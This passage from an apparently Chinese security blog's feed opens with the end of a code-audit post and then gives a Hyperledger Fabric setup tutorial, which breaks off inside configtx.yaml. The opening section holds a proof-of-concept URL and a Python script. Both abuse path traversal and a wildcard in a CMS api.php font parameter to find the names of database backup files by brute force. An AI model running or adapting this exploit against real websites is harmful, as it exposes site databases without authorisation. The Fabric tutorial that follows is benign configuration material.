operator">&lt;</span><span class="token operator">&lt;</span><span class="token punctuation">.</span>sql<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token punctuation">.</span>sql<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//存在</span>            poc<span class="token punctuation">:</span><span class="token operator">/</span>api<span class="token punctuation">.</span>php<span class="token operator">?</span>op<span class="token operator">=</span>creatimg<span class="token operator">&amp;</span>txt<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>font<span class="token operator">=</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>caches<span class="token operator">/</span>bakup<span class="token operator">/</span><span class="token keyword">default</span><span class="token operator">/</span>s<span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token punctuation">.</span>sql    <span class="token comment" spellcheck="true">// 若不存在返回：  Initialize new GD image stream</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、脚本"><a href="#2、脚本" class="headerlink" title="2、脚本"></a>2、脚本</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token triple-quoted-string string">'''author: dysec'''</span><span class="token keyword">import</span> urllib2<span class="token comment" spellcheck="true">#判断是否存在</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    mark <span class="token operator">=</span> <span class="token boolean">True</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'User-agent'</span><span class="token punctuation">,</span> <span class="token string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    content <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'Cannot'</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>        mark <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> mark<span class="token keyword">def</span> <span class="token function">guest</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> map<span class="token punctuation">(</span>chr<span class="token punctuation">,</span> range<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    alpha <span class="token operator">=</span> map<span class="token punctuation">(</span>chr<span class="token punctuation">,</span> range<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    exploit <span class="token operator">=</span> <span class="token string">'%s/api.php?op=creatimg&amp;txt=dysec&amp;font=/../../../../caches/bakup/default/%s%s&lt;&lt;.sql'</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> num<span class="token punctuation">:</span>            <span class="token keyword">if</span> check<span class="token punctuation">(</span>exploit <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#若存在</span>                arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> char <span class="token keyword">in</span> alpha<span class="token punctuation">:</span>                    <span class="token keyword">if</span> check<span class="token punctuation">(</span>exploit <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span>char<span class="token punctuation">)</span>                        <span class="token keyword">continue</span>            <span class="token keyword">elif</span> len<span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">20</span><span class="token punctuation">:</span>                arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'_db_'</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> len<span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">29</span><span class="token punctuation">:</span>                arr<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'_1.sql'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">'[*]not find!'</span>                <span class="token keyword">return</span>            <span class="token keyword">print</span> <span class="token string">'[*]find: %s/caches/bakup/default/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">'http://www.cms.com'</span>        <span class="token comment" spellcheck="true">#test</span>        guest<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hyperledger环境搭建</title>
      <link href="/2022/02/26/hyperledger%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/02/26/hyperledger%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="hyperledger环境搭建"><a href="#hyperledger环境搭建" class="headerlink" title="hyperledger环境搭建"></a>hyperledger环境搭建</h1><h2 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h2><h2 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h2><h2 id="3、hyperledger-fabic执行流程"><a href="#3、hyperledger-fabic执行流程" class="headerlink" title="3、hyperledger fabic执行流程"></a>3、hyperledger fabic执行流程</h2><p>1、 启动区块链的测试网络   ==&gt;  ./byfn.sh -m up</p><p>2、 创建证书 ,使用cryptogen的工具  ==&gt; Generate certificates using cryptogen tool</p><p>3、 创造order节点的创世区块 ==&gt;  Generating Order Genesis block</p><p>4、创建channel ==&gt; Generating channel configuration transaction ‘channel.tx’</p><p>5、创建锚节点</p><pre><code>Generating anchor peer update for org_goMSPGenerating anchor peer update for org_cppMSP</code></pre><p>6、docker启动</p><pre><code>Creating network "net_byfn" with the default driverCreating volume "net_orderer.example.com" with default driverCreating volume "net_peer0.org_go.example.com" with default driverCreating volume "net_peer1.org_go.example.com" with default driverCreating volume "net_peer0.org_cpp.example.com" with default driverCreating volume "net_peer1.org_cpp.example.com" with default driverCreating orderer.example.com    ... doneCreating peer0.org_cpp.example.com ... doneCreating peer0.org_go.example.com ... doneCreating peer1.org_go.example.com ... doneCreating peer1.org_cpp.example.com ... doneCreating cli                    ... done</code></pre><p>7、org_go里面peer0创建一个channel</p><pre><code>Channel "mychannel" is created successfully</code></pre><p>8、org_go的peer0加入mychannel</p><pre><code>peer1.org_go joined on the channel "mychannel"</code></pre><p>9、创建锚节点（anchor peer）</p><p>10、安装chaincode</p><p>11、实例化chaincode 背书策略 一个人统一就行</p><p>12、在org_cpp的实例化，可以在org_go查询</p><h1 id="手动安装hyperledger"><a href="#手动安装hyperledger" class="headerlink" title="手动安装hyperledger"></a>手动安装hyperledger</h1><h2 id="1、下载docker镜像"><a href="#1、下载docker镜像" class="headerlink" title="1、下载docker镜像"></a>1、下载docker镜像</h2><pre class="line-numbers language-shell"><code class="language-shell">docker pull hyperledger/fabric-peer:x86_64-1.1.0docker pull hyperledger/fabric-order:x86_64-1.1.0docker pull hyperledger/fabric-ccenv:x86_64-1.1.0docker pull hyperledger/fabric-tools:x86_64-1.1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、拉取第三方镜像"><a href="#2、拉取第三方镜像" class="headerlink" title="2、拉取第三方镜像"></a>2、拉取第三方镜像</h2><pre><code>couchdb  kafka zookeeperdocker pull hyperledger/fabric...</code></pre><h2 id="3、下载实例代码仓库"><a href="#3、下载实例代码仓库" class="headerlink" title="3、下载实例代码仓库"></a>3、下载实例代码仓库</h2><pre><code>git clone -b master ....</code></pre><h2 id="4、下载所需的二进制文件"><a href="#4、下载所需的二进制文件" class="headerlink" title="4、下载所需的二进制文件"></a>4、下载所需的二进制文件</h2><pre><code>curl ....</code></pre><p>docker rm $(docker ps -aq)</p><h1 id="手动搭建网络"><a href="#手动搭建网络" class="headerlink" title="手动搭建网络"></a>手动搭建网络</h1><h2 id="1、编写配置文件"><a href="#1、编写配置文件" class="headerlink" title="1、编写配置文件"></a>1、编写配置文件</h2><p>cryptogen  :生成对应的证书的工具</p><p>cryptogen showtemplate  &gt; a.yaml  输出配置文件的模板到a.yaml</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># "OrdererOrgs" - Definition of organizations managing orderer nodes</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span><span class="token comment" spellcheck="true">#排序节点对应的组织 ，可以集群</span><span class="token key atrule">OrdererOrgs</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>  <span class="token comment" spellcheck="true"># Orderer</span>  <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>  <span class="token punctuation">-</span> <span class="token key atrule">Name</span><span class="token punctuation">:</span> Orderer  <span class="token comment" spellcheck="true"># 排序节点组织的名字 ，这里配置的是组织</span>    <span class="token key atrule">Domain</span><span class="token punctuation">:</span> example.com  <span class="token comment" spellcheck="true">#根域名，排序节点组织的根域名</span>    <span class="token key atrule">EnableNodeOUs</span><span class="token punctuation">:</span> <span class="token boolean important">true </span><span class="token comment" spellcheck="true"># </span>    <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>    <span class="token comment" spellcheck="true"># "Specs" - See PeerOrgs below for complete description</span>    <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>    <span class="token comment" spellcheck="true">#使用Specs，二级域名可以自己指定</span>    <span class="token key atrule">Specs</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token key atrule">Hostname</span><span class="token punctuation">:</span> orderer   <span class="token comment" spellcheck="true"># 访问这台order对饮的域名是 ： order.example.com </span>      <span class="token comment" spellcheck="true">#可能有其他的Hostname: orderer1 ，在访问的时候的域名是:  order1.example.com</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># "PeerOrgs" - Definition of organizations managing peer nodes</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span><span class="token key atrule">PeerOrgs</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#此配置文件共有两个组织</span>  <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>  <span class="token comment" spellcheck="true"># org_go</span>  <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>  <span class="token punctuation">-</span> <span class="token key atrule">Name</span><span class="token punctuation">:</span> org_go    <span class="token comment" spellcheck="true">#第一个组织的名字 ， 自己的指定 </span>    <span class="token key atrule">Domain</span><span class="token punctuation">:</span> org_go.example.com   <span class="token comment" spellcheck="true">#访问第一个组织用的根域名</span>    <span class="token key atrule">EnableNodeOUs</span><span class="token punctuation">:</span> <span class="token boolean important">true    </span><span class="token comment" spellcheck="true">#是否支生成证书</span>       <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>    <span class="token key atrule">Template</span><span class="token punctuation">:</span>      <span class="token comment" spellcheck="true">#模板 ，根据默认的规则生成2个peer存储数据的节点</span>      <span class="token key atrule">Count</span><span class="token punctuation">:</span> <span class="token number">2  </span><span class="token comment" spellcheck="true">#1. peer0.org_go.example.com     peer1.org_go.example.com </span>    <span class="token key atrule">Users</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#创建的普通用户的个数</span>      <span class="token key atrule">Count</span><span class="token punctuation">:</span> <span class="token number">3</span>  <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>  <span class="token comment" spellcheck="true"># org_cpp: See "org_go" for full specification</span>  <span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------</span>  <span class="token punctuation">-</span> <span class="token key atrule">Name</span><span class="token punctuation">:</span> org_cpp    <span class="token key atrule">Domain</span><span class="token punctuation">:</span> org_cpp.example.com    <span class="token key atrule">EnableNodeOUs</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">Template</span><span class="token punctuation">:</span>      <span class="token key atrule">Count</span><span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token key atrule">Users</span><span class="token punctuation">:</span>      <span class="token key atrule">Count</span><span class="token punctuation">:</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、根据配置文件生成证书"><a href="#2、根据配置文件生成证书" class="headerlink" title="2、根据配置文件生成证书"></a>2、根据配置文件生成证书</h2><p>cryptogen generate –config=crypto-config.yaml</p><p>生成的文件目录</p><p><code>├── crypto-config │   ├── ordererOrganizations │   │   └── haozai.com │   │       ├── ca │   │       │   ├── b89b91ce9ae9889c846c29a3d17548bb635e54dbcc8fdee18aa7d0053bba85e4_sk │   │       │   └── ca.haozai.com-cert.pem │   │       ├── msp │   │       │   ├── admincerts │   │       │   ├── cacerts │   │       │   │   └── ca.haozai.com-cert.pem │   │       │   ├── config.yaml │   │       │   └── tlscacerts │   │       │       └── tlsca.haozai.com-cert.pem │   │       ├── orderers │   │       │   └── orderer.haozai.com │   │       │       ├── msp │   │       │       │   ├── admincerts │   │       │       │   ├── cacerts │   │       │       │   │   └── ca.haozai.com-cert.pem │   │       │       │   ├── config.yaml │   │       │       │   ├── keystore │   │       │       │   │   └── 52a0f98a1209eca8facb0fe559a575ebb7b9236cae93d518082351e63b029e73_sk │   │       │       │   ├── signcerts │   │       │       │   │   └── orderer.haozai.com-cert.pem │   │       │       │   └── tlscacerts │   │       │       │       └── tlsca.haozai.com-cert.pem │   │       │       └── tls │   │       │           ├── ca.crt │   │       │           ├── server.crt │   │       │           └── server.key │   │       ├── tlsca │   │       │   ├── c05f03756bc2c4d955e6f6103c1755c18cd336af76cc7da62b4f025d9bae2e53_sk │   │       │   └── tlsca.haozai.com-cert.pem │   │       └── users │   │           └── Admin@haozai.com │   │               ├── msp │   │               │   ├── admincerts │   │               │   ├── cacerts │   │               │   │   └── ca.haozai.com-cert.pem │   │               │   ├── config.yaml │   │               │   ├── keystore │   │               │   │   └── bbd7231b43947825a4fd2284005c6aa5d427301cf37b1a4be4a1ef35f693d9fb_sk │   │               │   ├── signcerts │   │               │   │   └── Admin@haozai.com-cert.pem │   │               │   └── tlscacerts │   │               │       └── tlsca.haozai.com-cert.pem │   │               └── tls │   │                   ├── ca.crt │   │                   ├── client.crt │   │                   └── client.key │   └── peerOrganizations │       ├── orgcpp.haozai.com │       │   ├── ca │       │   │   ├── 2a51699bf4d18a363fbdccc9b6d5d77e9df20aa90f08de4a695b6381fec33083_sk │       │   │   └── ca.orgcpp.haozai.com-cert.pem │       │   ├── msp │       │   │   ├── admincerts │       │   │   ├── cacerts │       │   │   │   └── ca.orgcpp.haozai.com-cert.pem │       │   │   ├── config.yaml │       │   │   └── tlscacerts │       │   │       └── tlsca.orgcpp.haozai.com-cert.pem │       │   ├── peers │       │   │   ├── peer0.orgcpp.haozai.com │       │   │   │   ├── msp │       │   │   │   │   ├── admincerts │       │   │   │   │   ├── cacerts │       │   │   │   │   │   └── ca.orgcpp.haozai.com-cert.pem │       │   │   │   │   ├── config.yaml │       │   │   │   │   ├── keystore │       │   │   │   │   │   └── 90fd8ac4de33446c5c4db4ad0a8a43105786cdf0e48eb892ae06a91227fc6f88_sk │       │   │   │   │   ├── signcerts │       │   │   │   │   │   └── peer0.orgcpp.haozai.com-cert.pem │       │   │   │   │   └── tlscacerts │       │   │   │   │       └── tlsca.orgcpp.haozai.com-cert.pem │       │   │   │   └── tls │       │   │   │       ├── ca.crt │       │   │   │       ├── server.crt │       │   │   │       └── server.key │       │   │   └── peer1.orgcpp.haozai.com │       │   │       ├── msp │       │   │       │   ├── admincerts │       │   │       │   ├── cacerts │       │   │       │   │   └── ca.orgcpp.haozai.com-cert.pem │       │   │       │   ├── config.yaml │       │   │       │   ├── keystore │       │   │       │   │   └── 995f06110a794916aae812fba23defef0c7ea1abf6d7be1205a5a70387abf0eb_sk │       │   │       │   ├── signcerts │       │   │       │   │   └── peer1.orgcpp.haozai.com-cert.pem │       │   │       │   └── tlscacerts │       │   │       │       └── tlsca.orgcpp.haozai.com-cert.pem │       │   │       └── tls │       │   │           ├── ca.crt │       │   │           ├── server.crt │       │   │           └── server.key │       │   ├── tlsca │       │   │   ├── 87d5d922c493ad9daf395f19f08585499355441b5fe3f580a3ab3737c3bcd7cb_sk │       │   │   └── tlsca.orgcpp.haozai.com-cert.pem │       │   └── users │       │       ├── Admin@orgcpp.haozai.com │       │       │   ├── msp │       │       │   │   ├── admincerts │       │       │   │   ├── cacerts │       │       │   │   │   └── ca.orgcpp.haozai.com-cert.pem │       │       │   │   ├── config.yaml │       │       │   │   ├── keystore │       │       │   │   │   └── 08fa38edf338be57bb7783596e09e23bde6f63c3ed6882f1a56ba960c2d2cd9d_sk │       │       │   │   ├── signcerts │       │       │   │   │   └── Admin@orgcpp.haozai.com-cert.pem │       │       │   │   └── tlscacerts │       │       │   │       └── tlsca.orgcpp.haozai.com-cert.pem │       │       │   └── tls │       │       │       ├── ca.crt │       │       │       ├── client.crt │       │       │       └── client.key │       │       ├── User1@orgcpp.haozai.com │       │       │   ├── msp │       │       │   │   ├── admincerts │       │       │   │   ├── cacerts │       │       │   │   │   └── ca.orgcpp.haozai.com-cert.pem │       │       │   │   ├── config.yaml │       │       │   │   ├── keystore │       │       │   │   │   └── e2f504b44a6bdc30434152a1e9e9789b984fd06fc038a21875007d7fa9fec4b4_sk │       │       │   │   ├── signcerts │       │       │   │   │   └── User1@orgcpp.haozai.com-cert.pem │       │       │   │   └── tlscacerts │       │       │   │       └── tlsca.orgcpp.haozai.com-cert.pem │       │       │   └── tls │       │       │       ├── ca.crt │       │       │       ├── client.crt │       │       │       └── client.key │       │       ├── User2@orgcpp.haozai.com │       │       │   ├── msp │       │       │   │   ├── admincerts │       │       │   │   ├── cacerts │       │       │   │   │   └── ca.orgcpp.haozai.com-cert.pem │       │       │   │   ├── config.yaml │       │       │   │   ├── keystore │       │       │   │   │   └── f6445f9e7f0fc807783fdc6c3e49bad0a823e7cf75a2e3b6f102432d8475b511_sk │       │       │   │   ├── signcerts │       │       │   │   │   └── User2@orgcpp.haozai.com-cert.pem │       │       │   │   └── tlscacerts │       │       │   │       └── tlsca.orgcpp.haozai.com-cert.pem │       │       │   └── tls │       │       │       ├── ca.crt │       │       │       ├── client.crt │       │       │       └── client.key │       │       └── User3@orgcpp.haozai.com │       │           ├── msp │       │           │   ├── admincerts │       │           │   ├── cacerts │       │           │   │   └── ca.orgcpp.haozai.com-cert.pem │       │           │   ├── config.yaml │       │           │   ├── keystore │       │           │   │   └── 70b9726bf13bd9d1376852c90f447403c79404bcf96def0017865c13bba95027_sk │       │           │   ├── signcerts │       │           │   │   └── User3@orgcpp.haozai.com-cert.pem │       │           │   └── tlscacerts │       │           │       └── tlsca.orgcpp.haozai.com-cert.pem │       │           └── tls │       │               ├── ca.crt │       │               ├── client.crt │       │               └── client.key │       └── orggo.haozai.com │           ├── ca │           │   ├── a8f642edcc9e6c80f856bec3ec6249b7b1f347d80e4ebe02290bbd8c1539b72e_sk │           │   └── ca.orggo.haozai.com-cert.pem │           ├── msp │           │   ├── admincerts │           │   ├── cacerts │           │   │   └── ca.orggo.haozai.com-cert.pem │           │   ├── config.yaml │           │   └── tlscacerts │           │       └── tlsca.orggo.haozai.com-cert.pem │           ├── peers │           │   ├── peer0.orggo.haozai.com │           │   │   ├── msp │           │   │   │   ├── admincerts │           │   │   │   ├── cacerts │           │   │   │   │   └── ca.orggo.haozai.com-cert.pem │           │   │   │   ├── config.yaml │           │   │   │   ├── keystore │           │   │   │   │   └── dbe1daf687e212bf0ae3658d7f44f13d437e0d8680d6c67d0c5cfe35dab8c6db_sk │           │   │   │   ├── signcerts │           │   │   │   │   └── peer0.orggo.haozai.com-cert.pem │           │   │   │   └── tlscacerts │           │   │   │       └── tlsca.orggo.haozai.com-cert.pem │           │   │   └── tls │           │   │       ├── ca.crt │           │   │       ├── server.crt │           │   │       └── server.key │           │   └── peer1.orggo.haozai.com │           │       ├── msp │           │       │   ├── admincerts │           │       │   ├── cacerts │           │       │   │   └── ca.orggo.haozai.com-cert.pem │           │       │   ├── config.yaml │           │       │   ├── keystore │           │       │   │   └── ce2578626295ee912b057bbbb3d2b260e394e4814806c958c918fdcb1d001eef_sk │           │       │   ├── signcerts │           │       │   │   └── peer1.orggo.haozai.com-cert.pem │           │       │   └── tlscacerts │           │       │       └── tlsca.orggo.haozai.com-cert.pem │           │       └── tls │           │           ├── ca.crt │           │           ├── server.crt │           │           └── server.key │           ├── tlsca │           │   ├── 2ef56e9456ffb909c64d4d3e042aeb9f5b400a05c0a1164a6ea545a227aab361_sk │           │   └── tlsca.orggo.haozai.com-cert.pem │           └── users │               ├── Admin@orggo.haozai.com │               │   ├── msp │               │   │   ├── admincerts │               │   │   ├── cacerts │               │   │   │   └── ca.orggo.haozai.com-cert.pem │               │   │   ├── config.yaml │               │   │   ├── keystore │               │   │   │   └── 6f1b6894ed2a8b62e7d2c23850e033eecf14b790654a0cbc9e283d8a6c22d2e6_sk │               │   │   ├── signcerts │               │   │   │   └── Admin@orggo.haozai.com-cert.pem │               │   │   └── tlscacerts │               │   │       └── tlsca.orggo.haozai.com-cert.pem │               │   └── tls │               │       ├── ca.crt │               │       ├── client.crt │               │       └── client.key │               ├── User1@orggo.haozai.com │               │   ├── msp │               │   │   ├── admincerts │               │   │   ├── cacerts │               │   │   │   └── ca.orggo.haozai.com-cert.pem │               │   │   ├── config.yaml │               │   │   ├── keystore │               │   │   │   └── 611f75daa1882ab1ff3e39bdff2625d77a377be05a58441c9da8796170a97fd9_sk │               │   │   ├── signcerts │               │   │   │   └── User1@orggo.haozai.com-cert.pem │               │   │   └── tlscacerts │               │   │       └── tlsca.orggo.haozai.com-cert.pem │               │   └── tls │               │       ├── ca.crt │               │       ├── client.crt │               │       └── client.key │               ├── User2@orggo.haozai.com │               │   ├── msp │               │   │   ├── admincerts │               │   │   ├── cacerts │               │   │   │   └── ca.orggo.haozai.com-cert.pem │               │   │   ├── config.yaml │               │   │   ├── keystore │               │   │   │   └── 7456472b76acd7764efcd97ce010bb5eb6342095b6e4b7ee137c7707683b2b52_sk │               │   │   ├── signcerts │               │   │   │   └── User2@orggo.haozai.com-cert.pem │               │   │   └── tlscacerts │               │   │       └── tlsca.orggo.haozai.com-cert.pem │               │   └── tls │               │       ├── ca.crt │               │       ├── client.crt │               │       └── client.key │               └── User3@orggo.haozai.com │                   ├── msp │                   │   ├── admincerts │                   │   ├── cacerts │                   │   │   └── ca.orggo.haozai.com-cert.pem │                   │   ├── config.yaml │                   │   ├── keystore │                   │   │   └── dd7ddc8b2a6940f69d7515d120192bb4a97db26bc736ff3968bfb4bd83e61c80_sk │                   │   ├── signcerts │                   │   │   └── User3@orggo.haozai.com-cert.pem │                   │   └── tlscacerts │                   │       └── tlsca.orggo.haozai.com-cert.pem │                   └── tls │                       ├── ca.crt │                       ├── client.crt │                       └── client.key └── crypto-config.yaml</code></p><pre><code>账号：     都是谁有msp        每一个节点都有一个msp账号        每个用户都有msp账号</code></pre><h2 id="3、创始快文件和通道文件的生成"><a href="#3、创始快文件和通道文件的生成" class="headerlink" title="3、创始快文件和通道文件的生成"></a>3、创始快文件和通道文件的生成</h2><p>文件名必须为 configtx.yaml</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Copyright IBM Corp. All Rights Reserved.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># SPDX-License-Identifier: Apache-2.0</span><span class="token comment" spellcheck="true">#</span><span class="token punctuation">---</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   Section: Organizations</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   - This section defines the different organizational identities which will</span><span class="token comment" spellcheck="true">#   be referenced later in the configuration.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">################################################################################</span><span class="token key atrule">Organizations</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true"># 排序节点组织</span>    <span class="token punctuation">-</span> <span class="token important">&amp;OrdererOrg</span>  <span class="token comment" spellcheck="true">#排序节点组织，自己起名字 ，&amp;是为了方便后面引用</span>        <span class="token key atrule">Name</span><span class="token punctuation">:</span> OrdererOrg  <span class="token comment" spellcheck="true">#排序节点组织名</span>        <span class="token key atrule">ID</span><span class="token punctuation">:</span> OrdererMSP   <span class="token comment" spellcheck="true">#排序节点组织的ID</span>        <span class="token comment" spellcheck="true"># MSPDir 表示组织的身份的路径MSP路径</span>        <span class="token key atrule">MSPDir</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/ordererOrganizations/haozai.com/msp        <span class="token comment" spellcheck="true"># Policies defines the set of policies at this level of the config tree</span>        <span class="token comment" spellcheck="true"># For organization policies, their canonical path is usually</span>        <span class="token comment" spellcheck="true">#   /Channel/&lt;Application|Orderer>/&lt;OrgName>/&lt;PolicyName></span>        <span class="token key atrule">Policies</span><span class="token punctuation">:</span>            <span class="token key atrule">Readers</span><span class="token punctuation">:</span>                <span class="token key atrule">Type</span><span class="token punctuation">:</span> Signature                <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"OR('OrdererMSP.member')"</span>            <span class="token key atrule">Writers</span><span class="token punctuation">:</span>                <span class="token key atrule">Type</span><span class="token punctuation">:</span> Signature                <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"OR('OrdererMSP.member')"</span>            <span class="token key atrule">Admins</span><span class="token punctuation">:</span>                <span class="token key atrule">Type</span><span class="token punctuation">:</span> Signature                <span class="token key atrule">Rule</span><span class="token punctuation">:</span> <span class="token string">"OR('OrdererMSP.admin')"</span>    <span class="token punctuation">-</span> <span class="token important">&amp;org_go</span>  <span class="token comment" spellcheck="true">#第一个组织，名字自己起</span>        <span class="token comment" spellcheck="true"># DefaultOrg defines the organization which is used in the sampleconfig</span>        <span class="token comment" spellcheck="true"># of the fabric.git development environment</span>        <span class="token key atrule">Name</span><span class="token punctuation">:</span> OrgGoMSP  <span class="token comment" spellcheck="true"># 第一个组织的名字</span>        <span class="token comment" spellcheck="true"># ID to load the MSP definition as</span>        <span class="token key atrule">ID</span><span class="token punctuation">:</span> OrgGoMSP    <span class="token comment" spellcheck="true">#第一个组织的ID</span>        <span class="token comment" spellcheck="true">#组织1 的MSP 路径</span>        <span class="token key atrule">MSPDir</span><span class="token punctuation">:</span> crypto<span class="token punctuation">-</span>config/peerOrganizations/orggo.haozai.com/msp        <span class="token comment" spellcheck="true">#Policies:</span>        <span class="token comment" spellcheck="true">#    Readers:</span>         <span class="token comment" spellcheck="true">#       Type: Signature</span>        <span class="token comment" spellcheck="true">#        Rule: "OR('org_goMSP.admin', 